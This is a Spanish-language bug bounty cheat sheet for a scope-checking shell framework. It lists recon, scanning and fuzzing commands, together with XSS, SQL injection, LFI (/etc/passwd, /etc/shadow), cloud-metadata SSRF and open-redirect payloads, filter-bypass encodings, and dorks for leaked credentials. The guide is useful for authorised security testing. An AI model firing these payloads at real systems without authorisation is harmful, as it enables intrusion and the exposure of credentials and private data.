# Bug Bounty Quick Reference Guide

## 🚀 Inicio Rápido

```bash
# 0. Crear/actualizar el scope del programa (una vez por programa)
./bugbounty-hunter.sh new nombre-programa
# -> editar ../programs/nombre-programa.md con el scope real de HackerOne

# 1. Verificar que el target está en scope antes de tocar nada
./bugbounty-hunter.sh scope example.com

# 1.5 Verificar que tu DNS local no está secuestrando/bloqueando el dominio
#     (común en nichos de apuestas/adultos/streaming — ISPs redirigen a una
#     página de advertencia en vez de resolver el sitio real)
./bugbounty-hunter.sh resolve example.com

# Pipeline completo
./bugbounty-hunter.sh full example.com

# Solo reconocimiento
./bugbounty-hunter.sh recon example.com

# Ver plataformas
./bugbounty-hunter.sh platforms
```

Todas las fases activas (`recon`, `vuln`, `brute`, `secrets`, `api`, `full`)
verifican el scope automáticamente contra `../programs/*.md` y abortan si el
target no está documentado o está marcado como *Out of Scope*.

---

## 🎯 Metodología de 5 Fases

### Fase 1: Reconocimiento
```bash
# Subdomain enumeration
subfinder -d target.com -o subdomains.txt
amass enum -passive -d target.com >> subdomains.txt

# HTTP probing
httpx -l subdomains.txt -o live.txt

# Wayback URLs
echo "target.com" | gau > wayback.txt
waybackurls target.com >> wayback.txt

# JS endpoints
katana -u "https://target.com" -d 3 -jc -o js_endpoints.txt
```

### Fase 2: Escaneo
```bash
# Nuclei - Vulnerability scanner
echo "https://target.com" | nuclei -severity critical,high

# CORS testing
nuclei -u "https://target.com" -t nuclei-templates/http/misconfiguration/cors*

# XSS detection
dalfox url "https://target.com/?param=test"

# SQL injection
sqlmap -u "https://target.com/?id=1" --batch --level=1
```

### Fase 3: Fuzzing
```bash
# Directory fuzzing
feroxbuster -u "https://target.com" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt

# Parameter fuzzing
ffuf -u "https://target.com/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

# VHost fuzzing
ffuf -u "https://target.com" -H "Host: FUZZ.target.com" -w subdomains.txt
```

### Fase 4: Explotación
```bash
# SSRF testing
curl "https://target.com/api?url=http://169.254.169.254/latest/meta-data/"

# IDOR testing
# Cambiar IDs en URLs: /user/123 → /user/124

# Open redirect
# Probar parámetros: ?next=, ?redirect=, ?url=, ?return=
```

### Fase 5: Reporting
```bash
# Generar reporte
./bugbounty-hunter.sh report example.com
```

---

## 🏆 Tipos de Vulnerabilidades (por bounty)

### Critical ($5,000+)
- Remote Code Execution (RCE)
- SQL Injection con acceso a datos
- Authentication bypass
- Server-side Request Forgery (SSRF) → Internal access
- Deserialization vulnerabilities

### High ($1,000-$5,000)
- Stored XSS
- IDOR con acceso a datos sensibles
- CSRF en acciones críticas
- Open redirect → Account takeover
- SSRF (sin acceso interno)

### Medium ($500-$1,000)
- Reflected XSS
- CSRF en acciones no críticas
- Information disclosure
- Missing rate limiting
- Session fixation

### Low ($100-$500)
- Version disclosure
- Missing security headers
- Verbose error messages
- Clickjacking
- Open redirect (sin impacto)

---

## 🛠️ Herramientas Esenciales

### Reconocimiento
| Herramienta | Uso |
|-------------|-----|
| subfinder | Subdomain enumeration |
| amass | OSINT enumeration |
| httpx | HTTP probing |
| waybackurls | Wayback Machine URLs |
| gau | URL fetcher |
| katana | Web crawler |

### Vulnerability Scanning
| Herramienta | Uso |
|-------------|-----|
| nuclei | Template-based scanning |
| dalfox | XSS scanner |
| sqlmap | SQL injection |
| ffuf | Web fuzzer |
| feroxbuster | Directory brute |

### Exploitation
| Herramienta | Uso |
|-------------|-----|
| curl | HTTP requests |
| wget | File download |
| python | Scripting |
| Burp Suite | HTTP proxy |

---

## 📋 Checklist de Seguridad

### Headers HTTP
- [ ] Strict-Transport-Security
- [ ] X-Content-Type-Options
- [ ] X-Frame-Options
- [ ] Content-Security-Policy
- [ ] X-XSS-Protection
- [ ] Referrer-Policy
- [ ] Permissions-Policy

### Cookies
- [ ] HttpOnly flag
- [ ] Secure flag
- [ ] SameSite attribute
- [ ] Path restriction
- [ ] Expiration

### Authentication
- [ ] Rate limiting
- [ ] Account lockout
- [ ] Password policy
- [ ] MFA support
- [ ] Session management

---

## 🎯 Dorking Queries

### Google Dorks
```
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com inurl:login
site:target.com intitle:"index of"
site:target.com ext:sql | ext:bak
site:target.com inurl:api
```

### GitHub Dorks
```
"target.com" password
"target.com" api_key
"target.com" secret
"target.com" credentials
filename:config.php target.com
```

---

## 🔐 Encoding Bypass Techniques

### Base64 Encoding
```bash
# Codificar payload
echo -n 'etc/passwd' | base64
# Resultado: ZXRjL3Bhc3N3ZA==

# Decodificar
echo 'ZXRjL3Bhc3N3ZA==' | base64 -d
```

### Payloads Comunes
| Original | Base64 |
|----------|--------|
| `/etc/passwd` | `L2V0Yy9wYXNzd2Q=` |
| `/etc/shadow` | `L2V0Yy9zaGFkb3c=` |
| `../../etc/passwd` | `Li4vLi4vLi4vZXRjL3Bhc3N3ZA==` |

### Uso en Ataques
```
# LFI Bypass
url/?f=L2V0Yy9wYXNzd2Q=        # /etc/passwd encoded

# SQL Injection Bypass
' OR 1=1 -- => JyBPUiAxPTEgLS0=

# XSS Bypass
<script>alert(1)</script> => PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### URL Encoding
```bash
# Codificar
python3 -c 'import urllib.parse; print(urllib.parse.quote("<script>"))'
# Resultado: %3Cscript%3E

# Doble encoding
python3 -c 'import urllib.parse; print(urllib.parse.quote("%3Cscript%3E"))'
# Resultado: %253Cscript%253E
```

### Unicode Encoding
```
< = \u003C
> = \u003E
' = \u0027
" = \u0022
```

### HTML Entity Encoding
```
< = &#60; or &#x3C;
> = &#62; or &#x3E;
' = &#39; or &#x27;
" = &#34; or &#x22;
```

### Mixed Encoding Attacks
```
# SQL Injection
' OR 1=1 --
=> %27%20OR%201%3D1%20--
=> %27%20%4F%52%201%3D1%20--

# XSS
<script>alert(1)</script>
=> %3Cscript%3Ealert(1)%3C/script%3E
=> &#60;script&#62;alert(1)&#60;/script&#62;

# LFI
../../etc/passwd
=> ..%2F..%2F..%2Fetc%2Fpasswd
=> ....//....//....//etc/passwd
```

---

## 📝 Plantillas de Payloads

### XSS
```javascript
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
```

### SQL Injection
```
' OR 1=1 --
' UNION SELECT NULL--
1' AND '1'='1
admin'--
```

### SSRF
```
http://169.254.169.254/latest/meta-data/
http://localhost:8080
http://[::1]
http://0177.0.0.1
```

### Open Redirect
```
https://target.com/redirect?url=https://evil.com
https://target.com/redirect?next=https://evil.com
https://target.com/redirect?return=https://evil.com
```

---

## 🏅 Certificaciones Relacionadas

- **OSCP** - OffSec Certified Professional
- **CEH** - Certified Ethical Hacker
- **OSWE** - OffSec Web Expert
- **BSCP** - Burp Suite Certified Practitioner
- **eWPT** - Web Application Penetration Tester

---

## 📚 Recursos de Aprendizaje

### Plataformas
- [TryHackMe](https://tryhackme.com) - Learning paths
- [HackTheBox](https://hackthebox.com) - Machines
- [PortSwigger](https://portswigger.net/web-security) - Web security
- [PicoCTF](https://picoctf.org) - CTF challenges

### Blogs
- [PortSwigger Research](https://portswigger.net/research)
- [Google Project Zero](https://googleprojectzero.blogspot.com)
- [Orange Tsai](https://blog.orange.tw)
- [Corben Leo](https://corben.io)

---

*dev101x — Bug Bounty Framework*
